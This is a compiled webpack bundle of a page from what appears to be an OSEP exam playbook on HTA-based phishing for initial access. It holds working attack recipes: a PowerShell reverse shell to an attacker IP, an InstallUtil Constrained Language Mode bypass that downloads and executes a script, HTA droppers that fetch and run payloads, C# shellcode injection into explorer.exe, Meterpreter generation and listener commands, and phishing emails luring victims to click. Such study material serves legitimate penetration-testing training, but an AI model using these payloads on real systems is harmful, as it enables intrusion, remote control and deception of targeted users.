"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[3768],{2706(e,s,n){n.r(s),n.d(s,{assets:()=>a,contentTitle:()=>o,default:()=>h,frontMatter:()=>l,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"osep/initial-access/phishing/HTA","title":"HTA","description":"C#\xa0for CLM Bypass with PS Script","source":"@site/docs/osep/initial-access/phishing/HTA.md","sourceDirName":"osep/initial-access/phishing","slug":"/osep/initial-access/phishing/HTA","permalink":"/OSEP-Playbook/osep/initial-access/phishing/HTA","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":5,"frontMatter":{"title":"HTA","sidebar_position":5},"sidebar":"tutorialSidebar","previous":{"title":"JScript","permalink":"/OSEP-Playbook/osep/initial-access/phishing/JScript"},"next":{"title":"C#","permalink":"/OSEP-Playbook/osep/initial-access/Payloads/C-sharp"}}');var r=n(4848),i=n(8453);const l={title:"HTA",sidebar_position:5},o=void 0,a={},c=[{value:"<strong><code>C#</code>\xa0for CLM Bypass with PS Script</strong>",id:"cfor-clm-bypass-with-ps-script",level:3},{value:"<strong><code>C#</code>\xa0for CLM Bypass with DotNetToJScript</strong>",id:"cfor-clm-bypass-with-dotnettojscript",level:3},{value:"<strong>JScript from SuperSharpShooter</strong>",id:"jscript-from-supersharpshooter",level:3}];function d(e){const s={a:"a",code:"code",em:"em",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.h3,{id:"cfor-clm-bypass-with-ps-script",children:(0,r.jsxs)(s.strong,{children:[(0,r.jsx)(s.code,{children:"C#"}),"\xa0for CLM Bypass with PS Script"]})}),"\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"Important Note"}),"\xa0There are a few things to note about this code. First, the _System.Configuration.Install_namespace is missing an assembly reference in Visual Studio. We can add this by again right-clicking on\xa0",(0,r.jsx)(s.em,{children:"References"}),"\xa0in the Solution Explorer and choosing\xa0",(0,r.jsx)(s.em,{children:"Add References..."}),". From here, we'll navigate to the\xa0",(0,r.jsx)(s.em,{children:"Assemblies"}),"\xa0menu on the left-hand side and scroll down to\xa0",(0,r.jsx)(s.em,{children:"System.Configuration.Install"})]}),"\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"How the Bypass CLM Works"}),"\xa0The bypass trick is not within the code but rather on the execution where we use\xa0",(0,r.jsx)(s.code,{children:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Tools\\Bypass.exe"}),"\xa0(see step 6)"]}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.strong,{children:"Steps"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Create the\xa0",(0,r.jsx)(s.code,{children:"shell.ps1"}),", in this case it is just a normal reverse (no Meterpreter) shell without bypassing AMSI but you can improve this"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"$client = New-Object System.Net.Sockets.TCPClient('[ATTACKER_IP]',[PORT]);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Create a new\xa0",(0,r.jsx)(s.em,{children:"Console App (.NET Framework)"})]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-csharp",children:'using System;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\nusing System.Configuration.Install;\n\nnamespace Bypass\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            Console.WriteLine("This is the main method.");\n        }\n    }\n\n    [System.ComponentModel.RunInstaller(true)]\n    public class Sample : System.Configuration.Install.Installer{\n        public override void Uninstall(System.Collections.IDictionary savedState)\n        {\n            String cmd = "IEX(New-Object Net.WebClient).DownloadString(\'http://[Attacker_IP]/shell.ps1";\n            Runspace rs = RunspaceFactory.CreateRunspace();\n            rs.Open();\n\n            PowerShell ps = PowerShell.Create();\n            ps.Runspace = rs;\n\n            ps.AddScript(cmd);\n\n            ps.Invoke();\n\n            rs.Close();\n        }\n    }\n}\n\n'})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"Add the missing references"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"Right-clicking on References in the Solution Explorer > Choosing Add References > Add System.Configuration.Install\n\nAlso add by browsing: C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"Compile the project"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"Release & Any CPU (also x64 could work)\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"Encode the program"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"certutil.exe -encode .\\Bypass\\bin\\Release\\Bypass.exe enc5.txt\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Create the\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:".hta"})}),"\xa0file"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-html",children:'<html><head><script language="JScript">\nvar shell = new ActiveXObject("WScript.Shell");\nvar res = shell.Run("powershell iwr -uri http://[ATTACKER_IP]/enc5.txt -outfile C:\\\\Windows\\\\Tasks\\\\enc7.txt; powershell certutil -decode C:\\\\Windows\\\\Tasks\\\\enc7.txt C:\\\\Windows\\\\Tasks\\\\gimme3.exe;C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe /logfile=/LogToConsole=false /U C:\\\\Windows\\\\Tasks\\\\gimme3.exe");\n<\/script></head><body><script language="JScript">\nself.close();\n<\/script></body></html>\n'})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Find a way to deliver the\xa0",(0,r.jsx)(s.code,{children:".hta"}),"\xa0file to the user, can be also sending an email"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:'swaks --body \'Please click here http://[ATTACKER_IP]/[MAL_FILE].hta\' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Issues with mail" -t [TARGET_ADDRESS] -f attacker@test.com --server [SMTP_SERVER_IP]\n\nsendEmail -s [SMTP_SERVER_IP] -t [TARGET_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -o message-content-type=html -m "Please click here http://[ATTACKER_IP]/[MAL_FILE].hta" -a [MAL_FILE].hta\n\n'})}),"\n",(0,r.jsx)(s.h3,{id:"cfor-clm-bypass-with-dotnettojscript",children:(0,r.jsxs)(s.strong,{children:[(0,r.jsx)(s.code,{children:"C#"}),"\xa0for CLM Bypass with DotNetToJScript"]})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.strong,{children:"Steps"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Download the\xa0",(0,r.jsx)(s.a,{href:"https://github.com/tyranid/DotNetToJScript",children:"DotNetToJScript"}),"\xa0project from GitHub"]}),"\n",(0,r.jsx)(s.li,{children:"Create the payload you want to execute, in this case a Meterpreter reverse shell"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f csharp\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Open\xa0",(0,r.jsx)(s.em,{children:"TestClass.cs"}),"\xa0and insert this code"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-csharp",children:'using System;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Linq;\nusing System.Runtime.InteropServices;\nusing System.Text;\nusing System.Windows.Forms;\n//using System.Threading.Tasks;\n\n[ComVisible(true)]\npublic class TestClass\n{\n\n    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n\n    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport("kernel32.dll")]\n    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);\n\n    [DllImport("kernel32.dll")]\n    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n    public TestClass()\n    {\n        Process[] expProc = Process.GetProcessesByName("explorer");\n        int pid = expProc[0].Id;\n        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);\n        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);\n        byte[] buf = new byte[874] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,\n0xcc,0x00,0x00,...,0x48,0x31,0xd2,\n0x89,0xda,0xff,0xd5};\n\n        IntPtr outSize;\n\n        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);\n\n        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n    }\n\n    public void RunProcess(string path)\n    {\n        Process.Start(path);\n    }\n}\n\n'})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Compile the project for\xa0",(0,r.jsx)(s.em,{children:"Release"})]}),"\n",(0,r.jsxs)(s.li,{children:["Convert the\xa0",(0,r.jsx)(s.code,{children:".exe"}),"\xa0to\xa0",(0,r.jsx)(s.code,{children:".js"})]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:".\\DotNetToJScript\\bin\\x64\\Release\\DotNetToJScript.exe .\\ExampleAssembly\\bin\\x64\\Release\\ExampleAssembly.dll --lang=Jscript --ver=v4 -o payload.js\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Create a\xa0",(0,r.jsx)(s.code,{children:"drop.hta"}),"\xa0file and insert all the code from\xa0",(0,r.jsx)(s.code,{children:"payload.js"})]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-html",children:'<html><head><script language="JScript">\n// PASTE WHOLE JS FILE HERE\n<\/script></head><body><script language="JScript">\nself.close();\n<\/script></body></html>\n'})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"Start your listener"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"Start your HTTP Server"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"python3 -m http.server 80\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Find a way to deliver the\xa0",(0,r.jsx)(s.code,{children:".hta"}),"\xa0file to the user and that he executes it, then you should get your reverse shell; remember that this hta file should be like a link or a shortcut and to works needs to be executed with\xa0",(0,r.jsx)(s.code,{children:"C:\\Windows\\System32\\mshta.exe"}),", below is just an example for email"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:'sendEmail -s [SNMP_SERVER] -t [VICTIM_EMAIL_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -m "Please click here http://[ATTACKER_IP]/drop.hta" -a drop.hta\n\n'})}),"\n",(0,r.jsx)(s.h3,{id:"jscript-from-supersharpshooter",children:(0,r.jsx)(s.strong,{children:"JScript from SuperSharpShooter"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.strong,{children:"Steps"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Download the SuperSharpShooter project from\xa0",(0,r.jsx)(s.a,{href:"https://github.com/ScriptIdiot/SuperSharpShooter",children:"GitHub"})]}),"\n",(0,r.jsx)(s.li,{children:"Craft your Meterpreter payload"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] -f raw -o shell.txt\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Run the tool to obtain the\xa0",(0,r.jsx)(s.code,{children:".js"}),"\xa0code, other options like AMSI evasion are available in the documentation of the GitHub"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.txt --payload js --output payload\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"Start your listener"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Create a\xa0",(0,r.jsx)(s.code,{children:".hta"}),"\xa0file, and copy all the contents of the\xa0",(0,r.jsx)(s.code,{children:"payload.js"}),"\xa0file into the below template"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-html",children:'<html><head><script language="JScript">\n// INSERT CODE HERE\n<\/script></head><body><script language="JScript">\nself.close();\n<\/script></body></html>\n'})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"Start your HTTP Server"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"python3 -m http.server 80\n\n"})}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsxs)(s.li,{children:["Deliver it to the user, remember that it has to be in the form of a link, so it could be a link or a shortcut like the one below:\xa0",(0,r.jsx)(s.code,{children:"C:\\Windows\\System32\\mshta.exe http://[ATTACKER_IP]/drop.hta"}),", below is just an example for email"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:'sendEmail -s [SNMP_SERVER] -t [VICTIM_EMAIL_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -m "Please click here http://[ATTACKER_IP]/drop.hta" -a drop.hta\n\n'})}),"\n",(0,r.jsx)(s.p,{children:"HTA JScript Access"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{src:"https://www.emmanuelsolis.com/img/hta_js_access.png",alt:"HTA JScript Access"})})]})}function h(e={}){const{wrapper:s}={...(0,i.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453(e,s,n){n.d(s,{R:()=>l,x:()=>o});var t=n(6540);const r={},i=t.createContext(r);function l(e){const s=t.useContext(i);return t.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function o(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:l(e.components),t.createElement(i.Provider,{value:s},e.children)}}}]);